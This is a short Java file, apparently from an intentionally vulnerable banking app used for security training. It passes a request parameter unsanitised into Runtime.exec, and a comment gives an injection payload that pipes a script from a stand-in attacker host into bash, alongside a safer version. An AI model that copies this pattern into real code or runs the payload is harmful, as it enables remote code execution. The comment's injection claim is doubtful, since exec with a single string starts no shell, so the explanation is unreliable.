package com.vulnbank.util;

import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

import java.io.IOException;

public class CommandUtil {

    // VULN-ID: VB-012 | CWE-78 | Severity: CRITICAL
    // OS Command Injection: user-supplied report name is concatenated directly into a
    // shell command string. Attacker can inject: monthly; curl attacker.com/shell.sh | bash
    // SAFE VERSION: pass arguments as a String[] array to avoid shell interpretation:
    //   String[] cmd = { "/bin/bash", "/opt/scripts/generate_report.sh", reportName };
    //   Process process = Runtime.getRuntime().exec(cmd);
    public static String generateReport(HttpServletRequest request) throws IOException {
        String reportName = request.getParameter("name");
        String cmd = "bash /opt/scripts/generate_report.sh " + reportName;
        Process process = Runtime.getRuntime().exec(cmd);
        return "Report generation started for: " + reportName;
    }
}
